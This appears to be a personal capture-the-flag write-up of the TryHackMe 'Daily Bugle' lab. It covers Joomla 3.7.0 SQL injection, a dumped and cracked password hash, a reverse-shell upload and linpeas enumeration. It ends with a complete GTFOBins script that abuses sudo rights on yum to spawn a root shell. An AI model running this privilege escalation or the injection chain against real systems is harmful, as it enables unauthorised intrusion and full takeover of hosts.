# TryHackMe Advanced Pentesting Daily-Bugle room

IP=`10.10.130.16`

Looked around the site, used gobuster and the directories listed in robots.txt (found from nmap) to explore sites
Discovered that the webpage is built from Joomla
Earlier nmap results showed it was running v.3.7.0

Googled exploits for Joomla 3.7.0 and found a python script pointing to it with an injection attack
The script has to be run with python2 not 3, with three the requests don't work properly. This was done as well as mending the script because of improper casting types

Got the following data from it:
`['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']`
And the long string looks a lot like a hash
Cracking it with jtr and rockyou.txt
`spiderman123` (who'd have guessed)

Logon to admin site and play around with settings
originally I tried to setup an FTP server through which I could pull files but it would not launch despite a number of configs tried

Then I tried looking for methods of which to create a reverse-shell, I noticed you can upload files via the extention tab.
Proceeded to upload a reverse shell and linpeas for priviledge esclation.

After running linpeas, it noticed a config file with an unhashes password which was incidentally the login for jjameson
It also found another hash encrypted as a Blowfish or bcrypt hash which cracked was `password` and I could not find any use for it

After logging on to jjameson, I checked his sudo abilities and noticed he could sudo `yum`
I proceeded to use a GTFObin for yum for root:
```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
Which succeeded and I got the root's flag!
[x] Daily Bugle 

